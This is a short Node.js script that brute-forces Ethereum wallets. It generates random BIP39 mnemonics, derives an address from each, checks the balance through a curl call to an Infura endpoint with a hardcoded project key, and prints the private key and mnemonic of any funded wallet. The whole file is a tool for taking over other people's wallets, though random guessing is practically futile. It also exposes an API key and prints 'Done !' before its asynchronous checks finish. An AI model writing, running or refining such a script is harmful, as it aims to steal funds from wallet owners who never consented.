const execShPromise = require('exec-sh').promise;
const bip39 = require('bip39');
const { EthHdWallet } = require('eth-hd-wallet');

async function bruteForce() {
  try {
    let mnemonic = bip39.generateMnemonic();
    let wallet = EthHdWallet.fromMnemonic(mnemonic);
    let [address] = wallet.generateAddresses(1);

    let outPut = await execShPromise(
      `curl -s -X POST --data \'{"jsonrpc":"2.0", "method":"eth_getBalance", "params":["${address}", "latest"], "id":1}\' https://mainnet.infura.io/v3/09caf3b3afa84f6cb9ec0055114b176a`,
      true
    );

    outPut = JSON.parse(outPut.stdout);
    let balance = outPut.result;
    balance = parseInt(balance);
    if (balance > 0) {
      let privateKey = wallet.getPrivateKey(address);
      privateKey = privateKey.toString('hex');
      console.log({ privateKey });
      console.log({ balance });
      console.log({ mnemonic });
    }
  } catch (err) {
    console.log(err);
  }
}

for (let i = 0; i < 100; i++) {
  bruteForce();
}

console.log('Done !');
